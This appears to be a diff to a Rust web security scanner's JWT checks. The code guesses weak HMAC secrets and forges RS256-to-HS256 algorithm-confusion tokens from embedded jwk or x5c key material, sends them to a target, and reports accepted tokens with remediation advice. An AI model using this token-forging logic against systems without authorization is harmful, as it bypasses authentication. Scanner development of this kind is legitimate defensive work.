@@ -345,14 +345,14 @@ fn decode_json(seg: &str) -> Option<Value> {
 }
 
 fn weak_secret_match(url: &str, header_b64: &str, payload_b64: &str, sig: &[u8]) -> Option<String> {
-    let mut candidates = WEAK_SECRET_LIST.clone();
+    let mut host_candidates: Vec<String> = Vec::new();
 
     if let Ok(parsed) = Url::parse(url) {
         if let Some(host) = parsed.host_str() {
-            candidates.push(host.to_string());
+            host_candidates.push(host.to_string());
             if let Some(root) = host.split('.').next() {
                 if !root.is_empty() {
-                    candidates.push(root.to_string());
+                    host_candidates.push(root.to_string());
                 }
             }
         }
@@ -360,11 +360,15 @@ fn weak_secret_match(url: &str, header_b64: &str, payload_b64: &str, sig: &[u8])
 
     let signing_input = format!("{header_b64}.{payload_b64}");
 
-    for secret in candidates {
+    for secret in WEAK_SECRET_LIST
+        .iter()
+        .map(String::as_str)
+        .chain(host_candidates.iter().map(String::as_str))
+    {
         if let Ok(mut mac) = HmacSha256::new_from_slice(secret.as_bytes()) {
             mac.update(signing_input.as_bytes());
             if mac.verify_slice(sig).is_ok() {
-                return Some(secret);
+                return Some(secret.to_string());
             }
         }
     }
@@ -396,89 +400,126 @@ async fn attempt_alg_confusion(
         return None;
     }
 
-    // For RS256->HS256 confusion the forged HS256 token is signed with public
-    // key material. We derive RSA modulus bytes from `jwk.n` or `x5c`.
-    let secret = match derive_alg_confusion_secret(header) {
-        Some(s) => s,
-        None => {
-            errors.push(CapturedError::from_str(
-                "jwt/alg_confusion",
-                Some(url.to_string()),
-                "Unable to derive RSA key material from JWT header (expected valid jwk.n or x5c certificate)",
-            ));
-            return None;
-        }
-    };
-
-    let mut new_header = header.clone();
-    if let Some(obj) = new_header.as_object_mut() {
-        obj.insert("alg".to_string(), Value::String("HS256".to_string()));
+    // For RS256->HS256 confusion the forged HS256 token is signed with
+    // attacker-controlled public key material. Try realistic encodings a
+    // vulnerable verifier may consume from JWT hints (`jwk`/`x5c`).
+    let secret_candidates = derive_alg_confusion_secrets(header);
+    if secret_candidates.is_empty() {
+        errors.push(CapturedError::from_str(
+            "jwt/alg_confusion",
+            Some(url.to_string()),
+            "Unable to derive RSA key material from JWT header (expected valid jwk {kty,n,e} or x5c certificate)",
+        ));
+        return None;
     }
 
-    let header_json = serde_json::to_vec(&new_header).ok()?;
-    let header_b64 = URL_SAFE_NO_PAD.encode(header_json);
-
-    let signing_input = format!("{header_b64}.{payload_b64}");
-    let mut mac = HmacSha256::new_from_slice(&secret).ok()?;
-    mac.update(signing_input.as_bytes());
-    let sig = mac.finalize().into_bytes();
-    let sig_b64 = URL_SAFE_NO_PAD.encode(sig);
-
-    let forged = format!("{header_b64}.{payload_b64}.{sig_b64}");
-    let auth_header = format!("Bearer {forged}");
-
-    let extra = vec![("Authorization".to_string(), auth_header)];
-    let resp = match client.get_with_headers(url, &extra).await {
-        Ok(r) => r,
-        Err(mut e) => {
-            e.message = format!("alg_confusion_probe: {}", e.message);
-            errors.push(e);
-            return None;
+    for (secret_source, secret) in secret_candidates {
+        let mut new_header = header.clone();
+        if let Some(obj) = new_header.as_object_mut() {
+            obj.insert("alg".to_string(), Value::String("HS256".to_string()));
         }
-    };
 
-    if resp.status < 400 {
-        return Some(
-            Finding::new(
-                url,
-                "jwt/alg-confusion",
-                "JWT RS256 -> HS256 confusion",
-                Severity::Critical,
-                "A forged HS256 token signed with a public key-like secret appears to be accepted.",
-                "jwt",
-            )
-            .with_evidence(format!(
-                "baseline_status: {baseline_status}, forged_status: {}",
-                resp.status
-            ))
-            .with_remediation(
-                "Reject HS256 tokens when using RS256 keys; ensure key type matches algorithm.",
-            ),
-        );
+        let header_json = match serde_json::to_vec(&new_header) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+        let header_b64 = URL_SAFE_NO_PAD.encode(header_json);
+
+        let signing_input = format!("{header_b64}.{payload_b64}");
+        let mut mac = match HmacSha256::new_from_slice(&secret) {
+            Ok(m) => m,
+            Err(_) => continue,
+        };
+        mac.update(signing_input.as_bytes());
+        let sig = mac.finalize().into_bytes();
+        let sig_b64 = URL_SAFE_NO_PAD.encode(sig);
+
+        let forged = format!("{header_b64}.{payload_b64}.{sig_b64}");
+        let auth_header = format!("Bearer {forged}");
+
+        let extra = vec![("Authorization".to_string(), auth_header)];
+        let resp = match client.get_with_headers(url, &extra).await {
+            Ok(r) => r,
+            Err(mut e) => {
+                e.message = format!("alg_confusion_probe[{secret_source}]: {}", e.message);
+                errors.push(e);
+                continue;
+            }
+        };
+
+        if resp.status < 400 {
+            return Some(
+                Finding::new(
+                    url,
+                    "jwt/alg-confusion",
+                    "JWT RS256 -> HS256 confusion",
+                    Severity::Critical,
+                    "A forged HS256 token signed with derived public key material appears to be accepted.",
+                    "jwt",
+                )
+                .with_evidence(format!(
+                    "baseline_status: {baseline_status}, forged_status: {}, key_source: {secret_source}",
+                    resp.status
+                ))
+                .with_remediation(
+                    "Reject HS256 tokens when using RS256 keys; ensure key type matches algorithm.",
+                ),
+            );
+        }
     }
 
     None
 }
 
-fn derive_alg_confusion_secret(header: &Value) -> Option<Vec<u8>> {
-    if let Some(secret) = header
-        .get("jwk")
-        .and_then(extract_rsa_modulus_from_jwk)
-        .filter(|s| !s.is_empty())
-    {
-        return Some(secret);
+fn derive_alg_confusion_secrets(header: &Value) -> Vec<(String, Vec<u8>)> {
+    let mut candidates: Vec<(String, Vec<u8>)> = Vec::new();
+    let mut seen: HashSet<Vec<u8>> = HashSet::new();
+
+    let mut push_candidate = |label: &str, secret: Vec<u8>| {
+        if secret.is_empty() {
+            return;
+        }
+        if seen.insert(secret.clone()) {
+            candidates.push((label.to_string(), secret));
+        }
+    };
+
+    if let Some((modulus, exponent)) = header.get("jwk").and_then(extract_rsa_components_from_jwk) {
+        if let Some(spki_der) = build_rsa_spki_der(&modulus, &exponent) {
+            push_candidate("jwk-spki-der", spki_der.clone());
+            push_candidate(
+                "jwk-spki-pem",
+                pem_encode("PUBLIC KEY", &spki_der).into_bytes(),
+            );
+        }
     }
 
-    header
+    if let Some(x5c_der) = header
         .get("x5c")
         .and_then(Value::as_array)
         .and_then(|arr| arr.first())
         .and_then(Value::as_str)
-        .and_then(extract_rsa_modulus_from_x5c)
-        .filter(|s| !s.is_empty())
+        .and_then(|s| BASE64_STD.decode(s.as_bytes()).ok())
+    {
+        push_candidate("x5c-cert-der", x5c_der.clone());
+        push_candidate(
+            "x5c-cert-pem",
+            pem_encode("CERTIFICATE", &x5c_der).into_bytes(),
+        );
+
+        if let Some(spki_der) = extract_subject_public_key_info_der_from_certificate(&x5c_der) {
+            push_candidate("x5c-spki-der", spki_der.clone());
+            push_candidate(
+                "x5c-spki-pem",
+                pem_encode("PUBLIC KEY", &spki_der).into_bytes(),
+            );
+        }
+    }
+
+    candidates
 }
 
-fn extract_rsa_modulus_from_jwk(jwk: &Value) -> Option<Vec<u8>> {
+fn extract_rsa_components_from_jwk(jwk: &Value) -> Option<(Vec<u8>, Vec<u8>)> {
     let obj = jwk.as_object()?;
     let kty = obj.get("kty").and_then(Value::as_str).unwrap_or_default();
     if !kty.eq_ignore_ascii_case("RSA") {
@@ -486,57 +527,142 @@ fn extract_rsa_modulus_from_jwk(jwk: &Value) -> Option<Vec<u8>> {
     }
 
     let n = obj.get("n").and_then(Value::as_str)?;
+    let e = obj.get("e").and_then(Value::as_str)?;
     let mut modulus = URL_SAFE_NO_PAD.decode(n.as_bytes()).ok()?;
-    while modulus.first() == Some(&0) {
-        modulus.remove(0);
+    let mut exponent = URL_SAFE_NO_PAD.decode(e.as_bytes()).ok()?;
+    trim_leading_zeros(&mut modulus);
+    trim_leading_zeros(&mut exponent);
+    if modulus.is_empty() || exponent.is_empty() {
+        return None;
     }
-    Some(modulus)
+    Some((modulus, exponent))
 }
 
-fn extract_rsa_modulus_from_x5c(x5c_der_b64: &str) -> Option<Vec<u8>> {
-    let cert_der = BASE64_STD.decode(x5c_der_b64.as_bytes()).ok()?;
-    extract_rsa_modulus_from_certificate_der(&cert_der)
+fn trim_leading_zeros(bytes: &mut Vec<u8>) {
+    while bytes.len() > 1 && bytes.first() == Some(&0) {
+        bytes.remove(0);
+    }
 }
 
-fn extract_rsa_modulus_from_certificate_der(cert_der: &[u8]) -> Option<Vec<u8>> {
-    // Walk DER for BIT STRING nodes that contain an RSA public key structure:
-    // BIT STRING (unused-bits=0) -> SEQUENCE -> INTEGER(modulus), INTEGER(exponent)
+fn build_rsa_spki_der(modulus: &[u8], exponent: &[u8]) -> Option<Vec<u8>> {
+    let rsa_pkcs1 = build_rsa_pkcs1_der(modulus, exponent)?;
+    let alg_id_value: Vec<u8> = vec![
+        0x06, 0x09, // OBJECT IDENTIFIER length 9
+        0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01,
+        0x01, // 1.2.840.113549.1.1.1 (rsaEncryption)
+        0x05, 0x00, // NULL
+    ];
+    let alg_id = der_tlv(0x30, &alg_id_value);
+
+    let mut bit_string = Vec::with_capacity(1 + rsa_pkcs1.len());
+    bit_string.push(0x00); // unused bits
+    bit_string.extend_from_slice(&rsa_pkcs1);
+    let subject_public_key = der_tlv(0x03, &bit_string);
+
+    let mut spki_value = Vec::with_capacity(alg_id.len() + subject_public_key.len());
+    spki_value.extend_from_slice(&alg_id);
+    spki_value.extend_from_slice(&subject_public_key);
+    Some(der_tlv(0x30, &spki_value))
+}
+
+fn build_rsa_pkcs1_der(modulus: &[u8], exponent: &[u8]) -> Option<Vec<u8>> {
+    if modulus.is_empty() || exponent.is_empty() {
+        return None;
+    }
+
+    let modulus_tlv = der_integer(modulus);
+    let exponent_tlv = der_integer(exponent);
+
+    let mut value = Vec::with_capacity(modulus_tlv.len() + exponent_tlv.len());
+    value.extend_from_slice(&modulus_tlv);
+    value.extend_from_slice(&exponent_tlv);
+    Some(der_tlv(0x30, &value))
+}
+
+fn der_integer(raw: &[u8]) -> Vec<u8> {
+    let mut v = raw.to_vec();
+    trim_leading_zeros(&mut v);
+    if v.is_empty() {
+        v.push(0);
+    }
+    if (v[0] & 0x80) != 0 {
+        v.insert(0, 0x00);
+    }
+    der_tlv(0x02, &v)
+}
+
+fn der_tlv(tag: u8, value: &[u8]) -> Vec<u8> {
+    let mut out = Vec::with_capacity(1 + value.len() + 5);
+    out.push(tag);
+    out.extend_from_slice(&der_len(value.len()));
+    out.extend_from_slice(value);
+    out
+}
+
+fn der_len(len: usize) -> Vec<u8> {
+    if len < 0x80 {
+        return vec![len as u8];
+    }
+    let mut bytes = Vec::new();
+    let mut n = len;
+    while n > 0 {
+        bytes.push((n & 0xff) as u8);
+        n >>= 8;
+    }
+    bytes.reverse();
+    let mut out = Vec::with_capacity(1 + bytes.len());
+    out.push(0x80 | (bytes.len() as u8));
+    out.extend_from_slice(&bytes);
+    out
+}
+
+fn pem_encode(label: &str, der: &[u8]) -> String {
+    let b64 = BASE64_STD.encode(der);
+    let mut out = String::new();
+    out.push_str("-----BEGIN ");
+    out.push_str(label);
+    out.push_str("-----\n");
+    for chunk in b64.as_bytes().chunks(64) {
+        out.push_str(String::from_utf8_lossy(chunk).as_ref());
+        out.push('\n');
+    }
+    out.push_str("-----END ");
+    out.push_str(label);
+    out.push_str("-----\n");
+    out
+}
+
+fn extract_subject_public_key_info_der_from_certificate(cert_der: &[u8]) -> Option<Vec<u8>> {
+    let (cert_tag, cert_value_start, cert_value_end, _) = parse_der_tlv(cert_der, 0)?;
+    if cert_tag != 0x30 {
+        return None;
+    }
+    let cert_seq = &cert_der[cert_value_start..cert_value_end];
+
+    let (tbs_tag, tbs_value_start, tbs_value_end, _) = parse_der_tlv(cert_seq, 0)?;
+    if tbs_tag != 0x30 {
+        return None;
+    }
+    let tbs = &cert_seq[tbs_value_start..tbs_value_end];
+
     let mut idx = 0usize;
-    while idx < cert_der.len() {
-        let (tag, value_start, value_end, next) = parse_der_tlv(cert_der, idx)?;
-        if tag == 0x03 && value_start < value_end {
-            let bit_string = &cert_der[value_start..value_end];
-            if bit_string.first() == Some(&0) {
-                if let Some(modulus) = extract_rsa_modulus_from_spki_bitstring(&bit_string[1..]) {
-                    return Some(modulus);
-                }
-            }
-        }
+    let (first_tag, _, _, next_idx) = parse_der_tlv(tbs, idx)?;
+    if first_tag == 0xA0 {
+        idx = next_idx;
+    }
+
+    // serialNumber, signature, issuer, validity, subject
+    for _ in 0..5 {
+        let (_, _, _, next) = parse_der_tlv(tbs, idx)?;
         idx = next;
     }
-    None
-}
 
-fn extract_rsa_modulus_from_spki_bitstring(bit_string_payload: &[u8]) -> Option<Vec<u8>> {
-    let (seq_tag, seq_start, seq_end, _) = parse_der_tlv(bit_string_payload, 0)?;
-    if seq_tag != 0x30 {
+    let (spki_tag, _, _, spki_next) = parse_der_tlv(tbs, idx)?;
+    if spki_tag != 0x30 {
         return None;
     }
 
-    let seq = &bit_string_payload[seq_start..seq_end];
-    let (int_tag, int_start, int_end, _) = parse_der_tlv(seq, 0)?;
-    if int_tag != 0x02 || int_start >= int_end {
-        return None;
-    }
-
-    let mut modulus = seq[int_start..int_end].to_vec();
-    while modulus.first() == Some(&0) {
-        modulus.remove(0);
-    }
-    if modulus.is_empty() {
-        return None;
-    }
-    Some(modulus)
+    Some(tbs[idx..spki_next].to_vec())
 }
 
 fn parse_der_tlv(input: &[u8], offset: usize) -> Option<(u8, usize, usize, usize)> {
